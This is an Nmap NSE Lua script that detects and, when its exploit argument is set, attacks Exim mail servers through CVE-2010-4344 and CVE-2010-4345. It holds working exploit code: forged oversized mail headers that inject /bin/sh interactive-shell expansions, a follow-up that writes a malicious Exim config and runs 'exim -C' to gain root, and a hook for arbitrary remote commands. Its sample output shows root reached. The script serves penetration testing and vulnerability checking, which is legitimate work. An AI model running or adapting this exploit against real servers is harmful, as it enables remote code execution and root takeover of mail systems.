local math = require "math"
local shortport = require "shortport"
local smtp = require "smtp"
local stdnse = require "stdnse"
local string = require "string"
local table = require "table"

description = [[
Checks for and/or exploits a heap overflow within versions of Exim
prior to version 4.69 (CVE-2010-4344) and a privilege escalation
vulnerability in Exim 4.72 and prior (CVE-2010-4345).

The heap overflow vulnerability allows remote attackers to execute
arbitrary code with the privileges of the Exim daemon
(CVE-2010-4344). If the exploit fails then the Exim smtpd child will
be killed (heap corruption).

The script also checks for a privilege escalation vulnerability that
affects Exim version 4.72 and prior. The vulnerability allows the exim
user to gain root privileges by specifying an alternate configuration
file using the -C option (CVE-2010-4345).

The <code>smtp-vuln-cve2010-4344.exploit</code> script argument will make
the script try to exploit the vulnerabilities, by sending more than 50MB of
data, it depends on the message size limit configuration option of the
Exim server. If the exploit succeed the <code>exploit.cmd</code> or
<code>smtp-vuln-cve2010-4344.cmd</code> script arguments can be used to
run an arbitrary command on the remote system, under the
<code>Exim</code> user privileges. If this script argument is set then it
will enable the <code>smtp-vuln-cve2010-4344.exploit</code> argument.

To get the appropriate debug messages for this script, please use -d2.

Some of the logic of this script is based on the metasploit
exim4_string_format exploit.
* http://www.metasploit.com/modules/exploit/unix/smtp/exim4_string_format

Reference:
* http://cve.mitre.org/cgi-bin/cvename.cgi?name=2010-4344
* http://cve.mitre.org/cgi-bin/cvename.cgi?name=2010-4345
]]

---
-- @usage
-- nmap --script=smtp-vuln-cve2010-4344 --script-args="smtp-vuln-cve2010-4344.exploit" -pT:25,465,587 <host>
-- nmap --script=smtp-vuln-cve2010-4344 --script-args="exploit.cmd='uname -a'" -pT:25,465,587 <host>
--
-- @output
-- PORT   STATE SERVICE
-- 25/tcp open  smtp
-- | smtp-vuln-cve2010-4344:
-- | Exim heap overflow vulnerability (CVE-2010-4344):
-- |   Exim (CVE-2010-4344): VULNERABLE
-- |     Shell command 'uname -a': Linux qemu-ubuntu-x32 2.6.38-8-generic #42-Ubuntu SMP Fri Jan 21 17:40:48 UTC 2011 i686 GNU/Linux
-- | Exim privileges escalation vulnerability (CVE-2010-4345):
-- |   Exim (CVE-2010-4345): VULNERABLE
-- |     Before 'id': uid=121(Debian-exim) gid=128(Debian-exim) groups=128(Debian-exim),45(sasl)
-- |_    After  'id': uid=0(root) gid=128(Debian-exim) groups=0(root)
--
-- @args smtp-vuln-cve2010-4344.exploit The script will force the checks,
--       and will try to exploit the Exim SMTP server.
-- @args smtp-vuln-cve2010-4344.mailfrom Define the source email address to
--       be used.
-- @args smtp-vuln-cve2010-4344.mailto Define the destination email address
--       to be used.
-- @args exploit.cmd or smtp-vuln-cve2010-4344.cmd An arbitrary command to
--       run under the <code>Exim</code> user privileges on the remote
--       system. If this argument is set then, it will enable the
--       <code>smtp-vuln-cve2010-4344.exploit</code> argument.

author = "Djalal Harouni"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"exploit", "intrusive", "vuln"}


portrule = shortport.port_or_service({25, 465, 587},
  {"smtp", "smtps", "submission"})

local function smtp_finish(socket, status, msg)
  if socket then
    smtp.quit(socket)
  end
  return status, msg
end

local function get_exim_banner(response)
  local banner, version
  banner = response:match("%d+%s(.+)")
  if banner then
    version = tonumber(banner:match("Exim%s([0-9%.]+)"))
  end
  return banner, version
end

local function send_recv(socket, data)
  local st, ret = socket:send(data)
  if st then
    st, ret = socket:receive_lines(1)
  end
  return st, ret
end

-- Exploit the privileges escalation vulnerability CVE-2010-4345.
-- return true, results (shell command results) If it was
-- successfully exploited.
local function escalate_privs(socket, smtp_opts)
  local exploited, results = false, ""
  local tmp_file = "/tmp/nmap"..tostring(math.random(0x0FFFFF, 0x7FFFFFFF))
  local exim_run = "exim -C"..tmp_file.." -q"
  local exim_spool = "spool_directory = \\${run{/bin/sh -c 'id > "..
  tmp_file.."' }}"

  stdnse.debug2("trying to escalate privileges")

  local status, ret = send_recv(socket, "id\n")
  if not status then
    return status, ret
  end
  results = string.format("    Before 'id': %s",
    string.gsub(ret, "^%$*%s*(.-)\n*%$*$", "%1"))

  status, ret = send_recv(socket,
    string.format("cat > %s << EOF\n",
    tmp_file))
  if not status then
    return status, ret
  end

  status, ret = send_recv(socket, exim_spool.."\nEOF\n")
  if not status then
    return status, ret
  end

  status, ret = send_recv(socket, exim_run.."\n")
  if not status then
    return status, ret
  end

  status, ret = send_recv(socket, string.format("cat %s\n", tmp_file))
  if not status then
    return status, ret
  elseif ret:match("uid=0%(root%)") then
    exploited = true
    results = results..string.format("\n    After  'id': %s",
      string.gsub(ret, "^%$*%s*(.-)\n*%$*$", "%1"))
    stdnse.debug2("successfully exploited the Exim privileges escalation.")
  end

  -- delete tmp file, should we care about this ?
  socket:send(string.format("rm -fr %s\n", tmp_file))
  return exploited, results
end

-- Tries to exploit the heap overflow and the privilege escalation
-- Returns true, exploit_status, possible values:
--  nil      Not vulnerable
--  "heap"   Vulnerable to the heap overflow
--  "heap-exploited"  The heap overflow vulnerability was exploited
local function exploit_heap(socket, smtp_opts)
  local exploited, ret = false, ""

  stdnse.debug2("exploiting the heap overflow")

  local status, response = smtp.mail(socket, smtp_opts.mailfrom)
  if not status then
    return status, response
  end

  status, response = smtp.recipient(socket, smtp_opts.mailto)
  if not status then
    return status, response
  end

  -- send DATA command
  status, response = smtp.datasend(socket)
  if not status then
    return status, response
  end

  local msg_len, log_buf_size = smtp_opts.size + (1024*256), 8192
  local log_buf = "YYYY-MM-DD HH:MM:SS XXXXXX-YYYYYY-ZZ rejected from"
  local log_host = string.format("%s(%s)",
    smtp_opts.ehlo_host ~= smtp_opts.domain and
    smtp_opts.ehlo_host.." " or "",
    smtp_opts.domain)
  log_buf = string.format("%s <%s> H=%s [%s]: message too big: "..
    "read=%s max=%s\nEnvelope-from: <%s>\nEnvelope-to: <%s>\n",
    log_buf, smtp_opts.mailfrom, log_host, smtp_opts.domain_ip,
    msg_len, smtp_opts.size, smtp_opts.mailfrom,
    smtp_opts.mailto)

  log_buf_size = log_buf_size - 3
  local filler, hdrs, nmap_hdr = string.rep("X", 8 * 16), "", "NmapHeader"

  while #log_buf < log_buf_size do
    local hdr = string.format("%s: %s\n", nmap_hdr, filler)
    local one = 2 + #hdr
    local two = 2 * one
    local left = log_buf_size - #log_buf
    if left < two and left > one then
      left = left - 4
      local first = left / 2
      hdr = string.sub(hdr, 0, first - 1).."\n"
      hdrs = hdrs..hdr
      log_buf = log_buf.."  "..hdr
      local second = left - first
      hdr = string.format("%s: %s\n", nmap_hdr, filler)
      hdr = string.sub(hdr, 0, second - 1).."\n"
    end
    hdrs = hdrs..hdr
    log_buf = log_buf.."  "..hdr
  end

  local hdrx = "HeaderX: "
  for i = 1, 50 do
    for fd = 3, 12 do
      hdrx = hdrx..
      string.format("${run{/bin/sh -c 'exec /bin/sh -i <&%d >&0 2>&0'}} ",
        fd)
    end
  end

  local function clean(socket, status, msg)
    socket:close()
    return status, msg
  end

  stdnse.debug1("sending forged mail, size: %.fMB", msg_len / (1024*1024))

  -- use low socket level functions.
  status, ret = socket:send(hdrs)
  if not status then
    return clean(socket, status, "failed to send hdrs.")
  end

  status, ret = socket:send(hdrx)
  if not status then
    return clean(socket, status, "failed to send hdrx.")
  end

  status, ret = socket:send("\r\n")
  if not status then
    return clean(socket, status, "failed to terminate headers.")
  end

  local body_size = 0
  filler = string.rep(string.rep("Nmap", 63).."XX\r\n", 1024)
  while body_size < msg_len do
    body_size = body_size + #filler
    status, ret = socket:send(filler)
    if not status then
      return clean(socket, status, "failed to send body.")
    end
  end

  status, response = smtp.query(socket, "\r\n.")
  if not status then
    if string.match(response, "connection closed") then
      -- the child was killed (heap corruption).
      return true, "heap"
    else
      return status, "failed to terminate the message."
    end
  end

  status, ret = smtp.check_reply("DATA", response)
  if not status then
    local code = tonumber(ret:match("(%d+)"))
    if code ~= 552 then
      smtp.quit(socket)
      return status, ret
    end
  end

  stdnse.debug2("the forged mail was sent successfully.")

  -- second round
  status, response = smtp.query(socket, "MAIL",
    string.format("FROM:<%s>", smtp_opts.mailfrom))
  if not status then
    return status, response
  end

  status, ret = smtp.query(socket, "RCPT",
    string.format("TO:<%s>", smtp_opts.mailto))
  if not status then
    return status, ret
  end

  if response:match("sh:%s") or ret:match("sh:%s") then
    stdnse.debug2("successfully exploited the Exim heap overflow.")
    exploited = "heap-exploited"
  end

  return true, exploited
end

-- Checks if the Exim server is vulnerable to CVE-2010-4344
local function check_exim(smtp_opts)
  local out, smtp_server = {}, {}
  local exim_heap_ver, exim_priv_ver = 4.69, 4.72
  local exim_default_size, nmap_scanme_ip = 52428800, '64.13.134.52'
  local heap_cve, priv_cve = 'CVE-2010-4344', 'CVE-2010-4345'
  local heap_str = "Exim heap overflow vulnerability ("..heap_cve.."):"
  local priv_str = "Exim privileges escalation vulnerability ("..priv_cve.."):"
  local exim_heap_result, exim_priv_result = "", ""

  local socket, ret = smtp.connect(smtp_opts.host,
    smtp_opts.port,
    {ssl = true,
      timeout = 8000,
      recv_before = true,
    lines = 1})

  if not socket then
    return smtp_finish(nil, socket, ret)
  end

  table.insert(out, heap_str)
  table.insert(out, priv_str)

  smtp_server.banner, smtp_server.version = get_exim_banner(ret)
  if smtp_server.banner then
    smtp_server.smtpd = smtp_server.banner:match("Exim")
    if smtp_server.smtpd and smtp_server.version then
      table.insert(out, 1,
        string.format("Exim version: %.02f", smtp_server.version))

      if smtp_server.version > exim_heap_ver then
        exim_heap_result = string.format("  Exim (%s): NOT VULNERABLE",
          heap_cve)
      else
        exim_heap_result = string.format("  Exim (%s): LIKELY VULNERABLE",
          heap_cve)
      end

      if smtp_server.version > exim_priv_ver then
        exim_priv_result = string.format("  Exim (%s): NOT VULNERABLE",
          priv_cve)
      else
        exim_priv_result = string.format("  Exim (%s): LIKELY VULNERABLE",
          priv_cve)
      end

    else
      return smtp_finish(socket, true,
        'The SMTP server is not Exim: NOT VULNERABLE')
    end
  else
    return smtp_finish(socket, false,
      'failed to read the SMTP banner.')
  end

  if not smtp_opts.exploit then
    table.insert(out, 3, exim_heap_result)
    table.insert(out, 5, exim_priv_result)
    table.insert(out,
      "To confirm and exploit the vulnerabilities, run with"..
      " --script-args='smtp-vuln-cve2010-4344.exploit'")
    return smtp_finish(socket, true, out)
  end

  -- force the checks and exploit the program
  local status, response = smtp.ehlo(socket, smtp_opts.domain)
  if not status then
    return smtp_finish(nil, status, response)
  end

  for _, line in pairs(stdnse.strsplit("\r?\n", response)) do
    if not smtp_opts.ehlo_host or not smtp_opts.domain_ip then
      smtp_opts.ehlo_host, smtp_opts.domain_ip =
      line:match("%d.-Hello%s(.*)%s%[([^]]*)%]")
    end
    if not smtp_server.size then
      smtp_server.size = line:match("%d+%-SIZE%s(%d+)")
    end
  end

  if not smtp_server.size then
    smtp_server.size = exim_default_size
  else
    smtp_server.size = tonumber(smtp_server.size)
  end
  smtp_opts.size = smtp_server.size

  -- use 'nmap.scanme.org' IP address
  if not smtp_opts.domain_ip then
    smtp_opts.domain_ip = nmap_scanme_ip
  end

  -- set the appropriate 'MAIL FROM' and 'RCPT TO' values
  if not smtp_opts.mailfrom then
    smtp_opts.mailfrom = string.format("root@%s", smtp_opts.domain)
  end
  if not smtp_opts.mailto then
    smtp_opts.mailto = string.format("postmaster@%s",
      smtp_opts.host.targetname and
      smtp_opts.host.targetname or 'localhost')
  end

  status, ret = exploit_heap(socket, smtp_opts)
  if not status then
    return smtp_finish(nil, status, ret)
  elseif ret then
    exim_heap_result = string.format("  Exim (%s): VULNERABLE",
      heap_cve)
    exim_priv_result = string.format("  Exim (%s): VULNERABLE",
      priv_cve)
    if ret:match("exploited") then
      -- clear socket
      socket:receive_lines(1)
      if smtp_opts.shell_cmd then
        status, response = send_recv(socket,
          string.format("%s\n", smtp_opts.shell_cmd))
        if status then
          exim_heap_result = exim_heap_result ..
          string.format("\n    Shell command '%s': %s",
            smtp_opts.shell_cmd,
            string.gsub(response, "^%$*%s*(.-)\n*%$*$", "%1"))
        end
      end

      status, response = escalate_privs(socket, smtp_opts)
      if status then
        exim_priv_result = exim_priv_result.."\n"..response
      end
      socket:close()
    end
  else
    exim_heap_result = string.format("  Exim (%s): NOT VULNERABLE",
      heap_cve)
  end

  table.insert(out, 3, exim_heap_result)
  table.insert(out, 5, exim_priv_result)
  return true, out
end

action = function(host, port)
  local smtp_opts = {
    host = host,
    port = port,
    domain = stdnse.get_script_args('smtp.domain') or
    'nmap.scanme.org',
    mailfrom = stdnse.get_script_args('smtp-vuln-cve2010-4344.mailfrom'),
    mailto = stdnse.get_script_args('smtp-vuln-cve2010-4344.mailto'),
    exploit = stdnse.get_script_args('smtp-vuln-cve2010-4344.exploit'),
    shell_cmd = stdnse.get_script_args('exploit.cmd') or
    stdnse.get_script_args('smtp-vuln-cve2010-4344.cmd'),
  }
  if smtp_opts.shell_cmd then
    smtp_opts.exploit = true
  end
  local status, output = check_exim(smtp_opts)
  if not status then
    stdnse.debug1("%s", output)
    return nil
  end
  return stdnse.format_output(status, output)
end
